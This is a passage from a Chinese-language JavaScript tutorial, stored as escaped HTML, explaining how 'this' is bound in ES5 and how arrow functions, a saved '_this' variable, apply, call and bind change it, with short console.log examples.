class=\"hljs-comment\"\u003e// undefined\u003c/span\u003e\n        }\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.a.fn();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里为什么会打印 \u003ccode\u003eundefined\u003c/code\u003e 呢？这是因为正如刚刚所描述的那样，调用 fn 的是 a 对象，也就是说 fn 的内部的 this 是对象 a，而对象 a 中并没有对 name 进行定义，所以 log 的 \u003ccode\u003ethis.name\u003c/code\u003e 的值是 \u003ccode\u003eundefined\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e这个例子还是说明了：\u003cstrong\u003ethis 永远指向最后调用它的那个对象\u003c/strong\u003e，因为最后调用 fn 的对象是 a，所以就算 a 中没有 name 这个属性，也不会继续向上一个对象寻找 \u003ccode\u003ethis.name\u003c/code\u003e，而是直接输出 \u003ccode\u003eundefined\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e再来看一个比较坑的例子：\u003cbr\u003e例 5：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e,\n        \u003cspan class=\"hljs-comment\"\u003e// name: \"Cherry\",\u003c/span\u003e\n        fn : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);      \u003cspan class=\"hljs-comment\"\u003e// windowsName\u003c/span\u003e\n        }\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e f = a.fn;\n    f();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里你可能会有疑问，为什么不是 \u003ccode\u003eCherry\u003c/code\u003e，这是因为虽然将 a 对象的 fn 方法赋值给变量 f 了，但是没有调用，再接着跟我念这一句话：“\u003cstrong\u003ethis 永远指向最后调用它的那个对象\u003c/strong\u003e”，由于刚刚的 f 并没有调用，所以 \u003ccode\u003efn()\u003c/code\u003e 最后仍然是被 window 调用的。所以 this 指向的也就是 window。\u003c/p\u003e\n\u003cp\u003e由以上五个例子我们可以看出，this 的指向并不是在创建的时候就可以确定的，在 es5 中，永远是\u003cstrong\u003ethis 永远指向最后调用它的那个对象\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e再来看一个例子：\u003cbr\u003e例 6：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003efn\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e'Cherry'\u003c/span\u003e;\n        innerFunction();\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003einnerFunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);      \u003cspan class=\"hljs-comment\"\u003e// windowsName\u003c/span\u003e\n        }\n    }\n\n    fn()\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e读到现在了应该能够理解这是为什么了吧(oﾟ▽ﾟ)o。\u003c/p\u003e\n\u003ch1 id=\"-this-\"\u003e怎么改变 this 的指向\u003c/h1\u003e\n\u003cp\u003e改变 this 的指向我总结有以下几种方法：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e使用 ES6 的箭头函数\u003c/li\u003e\n\u003cli\u003e在函数内部使用 \u003ccode\u003e_this = this\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e使用 \u003ccode\u003eapply\u003c/code\u003e、\u003ccode\u003ecall\u003c/code\u003e、\u003ccode\u003ebind\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003enew 实例化一个对象\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e例 7：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003efunc1\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name)     \n        },\n\n        \u003cspan class=\"hljs-attr\"\u003efunc2\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            setTimeout(  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.func1()\n            },\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e);\n        }\n\n    };\n\n    a.func2()     \u003cspan class=\"hljs-comment\"\u003e// this.func1 is not a function\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在不使用箭头函数的情况下，是会报错的，因为最后调用 \u003ccode\u003esetTimeout\u003c/code\u003e 的对象是 window，但是在 window 中并没有 func1 函数。\u003c/p\u003e\n\u003cp\u003e我们在改变 this 指向这一节将把这个例子作为 demo 进行改造。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e箭头函数\u003c/h2\u003e\n\u003cp\u003e众所周知，ES6 的箭头函数是可以避免 ES5 中使用 this 的坑的。\u003cstrong\u003e箭头函数的 this 始终指向函数定义时的 this，而非执行时。\u003c/strong\u003e，箭头函数需要记着这句话：“箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则，this 为 undefined”。\u003c/p\u003e\n\u003cp\u003e例 8 ：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003efunc1\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name)     \n        },\n\n        \u003cspan class=\"hljs-attr\"\u003efunc2\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            setTimeout( \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.func1()\n            },\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e);\n        }\n\n    };\n\n    a.func2()     \u003cspan class=\"hljs-comment\"\u003e// Cherry\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"-_this-this-\"\u003e在函数内部使用 \u003ccode\u003e_this = this\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003e如果不使用 ES6，那么这种方式应该是最简单的不会出错的方式了，我们是先将调用这个函数的对象保存在变量 \u003ccode\u003e_this\u003c/code\u003e 中，然后在函数中都使用这个 \u003ccode\u003e_this\u003c/code\u003e，这样 \u003ccode\u003e_this\u003c/code\u003e 就不会改变了。\u003cbr\u003e例 9：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003efunc1\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name)     \n        },\n\n        \u003cspan class=\"hljs-attr\"\u003efunc2\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e _this = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e;\n            setTimeout( \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n                _this.func1()\n            },\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e);\n        }\n\n    };\n\n    a.func2()       \u003cspan class=\"hljs-comment\"\u003e// Cherry\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个例子中，在 func2 中，首先设置 \u003ccode\u003evar _this = this;\u003c/code\u003e，这里的 \u003ccode\u003ethis\u003c/code\u003e 是调用 \u003ccode\u003efunc2\u003c/code\u003e 的对象 a，为了防止在 \u003ccode\u003efunc2\u003c/code\u003e 中的 setTimeout 被 window 调用而导致的在 setTimeout 中的 this 为 window。我们将 \u003ccode\u003ethis(指向变量 a)\u003c/code\u003e 赋值给一个变量 \u003ccode\u003e_this\u003c/code\u003e，这样，在 \u003ccode\u003efunc2\u003c/code\u003e 中我们使用 \u003ccode\u003e_this\u003c/code\u003e 就是指向对象 a 了。\u003c/p\u003e\n\u003ch2 id=\"-apply-call-bind\"\u003e使用 apply、call、bind\u003c/h2\u003e\n\u003cp\u003e使用 apply、call、bind 函数也是可以改变 this 的指向的，原理稍后再讲，我们先来看一下是怎么实现的：\u003c/p\u003e\n\u003ch3 id=\"-apply\"\u003e使用 apply\u003c/h3\u003e\n\u003cp\u003e例 10：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003efunc1\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name)\n        },\n\n        \u003cspan class=\"hljs-attr\"\u003efunc2\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            setTimeout(  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.func1()\n            }.apply(a),\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e);\n        }\n\n    };\n\n    a.func2()            \u003cspan class=\"hljs-comment\"\u003e// Cherry\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"-call\"\u003e使用 call\u003c/h3\u003e\n\u003cp\u003e例 11：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003efunc1\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name)\n        },\n\n        \u003cspan class=\"hljs-attr\"\u003efunc2\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            setTimeout(  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.func1()\n            }.call(a),\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e);\n        }\n\n    };\n\n    a.func2()            \u003cspan class=\"hljs-comment\"\u003e// Cherry\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"-bind\"\u003e使用 bind\u003c/h3\u003e\n\u003cp\u003e例 12：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003efunc1\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name)\n        },\n\n        \u003cspan class=\"hljs-attr\"\u003efunc2\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            setTimeout(  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.func1()\n            }.bind(a)(),\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e);\n        }\n\n    };\n\n    a.func2()            \u003cspan class=\"hljs-comment\"\u003e// Cherry\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch1 id=\"apply-call-bind-\"\u003eapply、call、bind 区别\u003c/h1\u003e\n\u003cp\u003e刚刚我们已经介绍了 apply、call、bind 都是可以改变 this 的指向的，但是这三个函数稍有不同。\u003c/p\u003e\n\u003cp\u003e在 \u003ca href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply\" target=\"_blank\"\u003eMDN\u003c/a\u003e 中定义 apply 如下；\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eapply() 方法调用一个函数, 其具有一个指定的this值，以及作为一个数组（或类似数组的对象）提供的参数\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e语法：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003efun.apply(thisArg, [argsArray])\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003ethisArg：在 fun 函数运行时指定的 this 值。需要注意的是，指定的 this 值并不一定是该函数执行时真正的 this 值，如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动指向全局对象（浏览器中就是window对象），同时值为原始值（数字，字符串，布尔值）的 this 会指向该原始值的自动包装对象。\u003c/li\u003e\n\u003cli\u003eargsArray：一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 fun 函数。如果该参数的值为null 或 undefined，则表示不需要传入任何参数。从ECMAScript 5 开始可以使用类数组对象。浏览器兼容性请参阅本文底部内容。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"apply-call-\"\u003eapply 和 call 的区别\u003c/h2\u003e\n\u003cp\u003e其实 apply 和 call 基本类似，他们的区别只是传入的参数不同。\u003c/p\u003e\n\u003cp\u003ecall 的语法为：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\"\u003efun.call(thisArg[, arg1[, arg2[, ...]]])\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以 apply 和 call 的区别是 call 方法接受的是若干个参数列表，而 apply 接收的是一个包含多个参数的数组。\u003c/p\u003e\n\u003cp\u003e例 13：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a ={\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003efn\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ea,b\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log( a + b)\n        }\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = a.fn;\n    b.apply(a,[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e])     \u003cspan class=\"hljs-comment\"\u003e// 3\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e例 14：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a ={\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003efn\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ea,b\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log( a + b)\n        }\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = a.fn;\n    b.call(a,\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e)       \u003cspan class=\"hljs-comment\"\u003e// 3\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"bind-apply-call-\"\u003ebind 和 apply、call 区别\u003c/h2\u003e\n\u003cp\u003e我们先来将刚刚的例子使用 bind 试一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a ={\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003efn\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ea,b\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log( a + b)\n        }\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = a.fn;\n    b.bind(a,\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们会发现并没有输出，这是为什么呢，我们来看一下 \u003ca href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind\" target=\"_blank\"\u003eMDN\u003c/a\u003e 上的文档说明：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003ebind()方法创建一个新的函数, 当被调用时，将其this关键字设置为提供的值，在调用新函数时，在任何提供之前提供一个给定的参数序列。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e所以我们可以看出，bind 是创建一个新的函数，我们必须要手动去调用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a ={\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003efn\u003c/span\u003e : \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ea,b\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log( a + b)\n        }\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e b = a.fn;\n    b.bind(a,\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e)()           \u003cspan class=\"hljs-comment\"\u003e// 3\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e==================================== 更新==============================\u003c/p\u003e\n\u003ch1 id=\"js-\"\u003eJS 中的函数调用\u003c/h1\u003e\n\u003cp\u003e看到留言说，很多童靴不理解为什么 例 6 的 innerFunction 和 例 7 的 this 是指向 window 的，所以我就来补充一下 JS 中的函数调用。\u003cbr\u003e例 6：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003efn\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e'Cherry'\u003c/span\u003e;\n        innerFunction();\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003einnerFunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);      \u003cspan class=\"hljs-comment\"\u003e// windowsName\u003c/span\u003e\n        }\n    }\n\n    fn()\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e例 7：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e a = {\n        \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e,\n\n        \u003cspan class=\"hljs-attr\"\u003efunc1\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name)     \n        },\n\n        \u003cspan class=\"hljs-attr\"\u003efunc2\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n            setTimeout(  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n                \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.func1()\n            },\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e);\n        }\n\n    };\n\n    a.func2()     \u003cspan class=\"hljs-comment\"\u003e// this.func1 is not a function\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e函数调用的方法一共有 4 种\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e作为一个函数调用\u003c/li\u003e\n\u003cli\u003e函数作为方法调用\u003c/li\u003e\n\u003cli\u003e使用构造函数调用函数\u003c/li\u003e\n\u003cli\u003e作为函数方法调用函数（call、apply）\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"-\"\u003e作为一个函数调用\u003c/h2\u003e\n\u003cp\u003e比如上面的 例 1：\u003cbr\u003e例 1：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\"\u003e    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"windowsName\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ea\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e name = \u003cspan class=\"hljs-string\"\u003e\"Cherry\"\u003c/span\u003e;\n\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.name);          \u003cspan class=\"hljs-comment\"\u003e// windowsName\u003c/span\u003e\n\n        \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"inner:\"\u003c/span\u003e + \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e);    \u003cspan class=\"hljs-comment\"\u003e// inner: Window\u003c/span\u003e\n    }\n    a();\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"outer:\"\u003c/span\u003e + \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e)         \u003cspan class=\"hljs-comment\"\u003e// outer: 